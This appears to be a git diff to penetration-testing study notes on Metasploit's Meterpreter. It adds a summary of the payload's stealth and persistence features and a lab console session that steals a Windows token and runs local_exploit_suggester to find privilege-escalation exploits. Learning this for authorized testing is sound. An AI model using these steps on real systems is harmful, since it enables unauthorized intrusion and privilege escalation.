@@ -627,7 +627,7 @@ Active sessions can be backgrounded when they maintain communication with the ta
 
 1. Keyboard Shortcut: CTRL+Z (Universal)
 
-2. Meterpreter Command: background (Meterpreter-specific)
+2. Meterpreter Command: meterpreter > bg
 
 **Process Flow:**
 
@@ -635,7 +635,7 @@ Active sessions can be backgrounded when they maintain communication with the ta
 
 2. Confirm action via prompt
 
-3. Return to msf6 > console
+3. Return to msf6
 
 4. Immediately deploy new modules
 
@@ -687,7 +687,143 @@ msf6 > exploit -j
 <details>
 <summary><h3>Meterpreter</h3></summary>
 
-Text
+The Meterpreter payload is an advanced, modular attack platform that employs sophisticated techniques to maintain stealth and persistence:
+
+<details>
+<summary><h4>Objectives</h4></summary>
+
+* Provide a stable, extensible platform for internal host enumeration
+
+* Facilitate rapid privilege escalation path discovery
+
+* Enable advanced defensive evasion techniques
+
+</details>
+
+<details>
+<summary><h4>Capabilites</h4></summary>
+
+* Utilizes reflective DLL injection for stable, low-detectability implants
+
+* Supports memory-only operation (no disk artifacts)
+
+* Features configurable persistence mechanisms
+
+</details>
+
+<details>
+<summary><h4>Operational Advantages</h4></summary>
+
+1. Stealth Characteristics
+
+    * No traditional process spawning
+
+    * Avoids disk writes (in-memory execution only)
+
+    * Encrypted communications channel
+
+2. Persistence Options
+
+    * Survives system reboots when properly configured
+
+    * Maintains sessions through network changes
+
+    * Supports migration between processes
+
+3. Extended Functionality
+
+    * Modular architecture for on-demand capability expansion
+
+    * Built-in privilege escalation techniques
+
+    * Comprehensive post-exploitation toolkit
+</details>
+
+<details>
+<summary><h4>Using Meterpreter</h4></summary>
+
+**MSF - Help**
+
+```bash
+meterpreter > help
+``` 
+
+**MSF - Meterpreter Migration**
+
+```bash
+meterpreter > getuid
+# [-] 1055: Operation failed: Access is denied.
+
+meterpreter > ps
+# Process List
+# ============
+# 
+#  PID   PPID  Name               Arch  Session  User                          Path
+#  ---   ----  ----               ----  -------  ----                          ----
+#  0     0     [System Process]                                                
+#  4     0     System                                                  #         
+#  216   1080  cidaemon.exe                                                    
+#  272   4     smss.exe                                                     #    
+#  292   1080  cidaemon.exe                                                    
+# <...SNIP...>
+
+# 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+
+
+meterpreter > steal_token 1836
+# Stolen token with username: NT AUTHORITY\NETWORK SERVICE
+
+meterpreter > getuid
+
+# Server username: NT AUTHORITY\NETWORK SERVICE
+
+``` 
+
+**MSF - Meterpreter Migration**
+```bash
+meterpreter > bg
+
+# Background session 1? [y/N]  y
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester
+
+# Matching Modules
+# ================
+# 
+#    #  Name                                      Disclosure Date  Rank    Check  Description
+#    -  ----                                       ---------------  ----    -----  -----------
+#    0  post/multi/recon/ local_exploit_suggester                   normal   No     Multi Recon Local Exploit Suggester
+
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
+msf6 post(multi/recon/local_exploit_suggester) > show options
+
+# Module options (post/multi/recon/local_exploit_suggester):
+# 
+#    Name             Current Setting  Required  Description
+#    ----             ---------------  --------  -----------
+#    SESSION                           yes       The session to run this module on
+#    SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits
+
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+
+# SESSION => 1
+
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+# [*] 10.10.10.15 - Collecting local exploits for x86/windows...
+# [*] 10.10.10.15 - 34 exploit checks are being tried...
+# [+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+# [+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+# [+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+# [+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+# [+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+# [+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+# [*] Post module execution completed 
+
+msf6 post(multi/recon/local_exploit_suggester) > 
+```
+
+</details>
 
 </details>
 
